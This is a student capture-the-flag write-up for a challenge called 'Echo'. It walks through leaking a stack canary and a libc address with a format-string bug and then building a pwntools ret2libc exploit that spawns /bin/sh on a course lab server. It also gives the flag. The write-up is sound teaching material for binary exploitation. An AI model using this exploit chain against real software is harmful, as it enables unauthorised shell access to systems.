# Optional CTF - Echo
<figure>
<img src='https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MXwAmlrjE8Ejl_0OQQX%2F-MY1FO9lURZfx9fTrAf0%2Fimage.png?alt=media&token=39659182-e3ff-4d34-a031-c7091567890a' />
<figcaption>Stak explanation (link: https://2603957456-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-MXwAmlrjE8Ejl_0OQQX%2F-MY1FO9lURZfx9fTrAf0%2Fimage.png?alt=media&token=39659182-e3ff-4d34-a031-c7091567890a)</figcaption>
</figure>

**1.** Firstly, we checked the file given using the checksec command.

![Image 01 - checksec file program](CTFs/Opcionals/Img/4-Echo/1.checksec_program.png)

- Seeing the resuts, we can conclude that it's going to be difficult to overwrite the stack beacause this stack as a canary protecting him.

- After some time thinking, we got to the conclusion that we would need to overwrite the return address, and in order to do this we would need to store the canary's value.

- We were given the _libc_ library. We can now use the _strings_ utility to find the offset of string **/bin/sh** relative to the start of the libc binary:

```bash
strings -a -t x libc.so.6 | grep "/bin/sh"
```

![Image 02 - /bin/sh address](CTFs/Opcionals/Img/4-Echo/2.bin_sh_address.png)

- This means that, in our vulnerable program, at address 0x1bd0f5 we should see the string `/bin/sh`.

**2.** Secondly, we need to find the offset address of the _libc_ library.

```bash
readelf.py -s libc.so.6 lgrep system
```

![Image 03 - base address of the _libc_ library](CTFs/Opcionals/Img/4-Echo/3.glibc_library_address.png)

- In this case, we can conclude that the memeory address of the offset of the _libc_ library is `0x00048150`.

**3.** Thirdly, we need to find the address where the vulnerability starts in our program.

```bash
(gdb) info proc map
```

- From the output we can conclude that the base address of the _libc_ library where the vulnerability starts in our _program_ file is at 0xf7d89000.


**4.** After getting all this values, we can create a python script that prints all the values that are on the memory interval of the _libc_ library. 

```py
#!/usr/bin/python3
from pwn import *

p = remote("ctf-fsi.fe.up.pt", 4002)

for i in range(1,14):
    p.recvuntil(b">")
    p.sendline(b"e")
    p.recvuntil(b"Insert your name (max 20 chars): ")
    p.sendline("%" + str(i) + "$10p")
    answer = p.recvline()
    print("i: ", i, "->stack", answer)
    p.recvuntil(b"Insert your message: ")
    p.sendline(b"")

p.interactive()
```

![Image4 - getValues.py value in the middle](CTFs/Opcionals/Img/4-Echo/4.address_in_the_middle_of_the_stack.png)

- From the result, we need to store the value that is between the start address of the program file and the end address of the same. We ca conclude, in this case, that the value is `0xf7e24ecb`. In our case, we used the value got on the 1st try `0xf7daa519`. 

- After this, run once again the getValues.py file.

![Image5 - getValues.py canary address](CTFs/Opcionals/Img/4-Echo/5.get_value_result.png)

- We also need to store the value of the canary in order to store it after the stack be overwritten (address of canary is `0x59e48500`).


**5.** After getting all this 5 values, we need to create a python script in order to unloack the working directory and cat the flag.

```py
#!/usr/bin/python3
from pwn import *

LOCAL = False

valueInTheMiddleLibc = 0xf7daa519
addressLib = 0xf7d89000
referenceLibOffset = valueInTheMiddleLibc - addressLib
systemLibOffset = 0x00048150
shLibOffset = 0x1bd0f5

def sendMessage(p,message):
	p.recvuntil(b">")
	p.sendline(b"e")
	p.recvuntil(b"Insert your name (max 20 chars): ")
	p.sendline(message)
	answer = p.recvline()
	p.recvuntil(b"Insert your message: ")
	p.sendline(b"")
	
	return answer

if LOCAL:
	pause()
else:
	p = remote("ctf-fsi.fe.up.pt", 4002)

message1 = sendMessage(p, b"%8$x | %11$x")

canary, referenceVal = [int(val,16) for val in message1.split(b'|')]

libBase = referenceVal - referenceLibOffset
addressSystem = libBase + systemLibOffset
addressSH = libBase + shLibOffset

message2 = flat(b"A"*20, canary + 1, b"A"*8, addressSystem, b"A"*4, addressSH)

sendMessage(p,message2)

message3 = b"E"*19

sendMessage(p,message3)

p.interactive()
```

- Running this python script, we are able to enter the working directory and get the _flag.txt_.

![Image6 - exploit-example.py result, flag](CTFs/Opcionals/Img/4-Echo/6.flag_result.png)


### Flag

`flag{122d40cb0dd355c631057cf597de3dac}`

<span>* We based our research and procedure in the website: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc .</span>
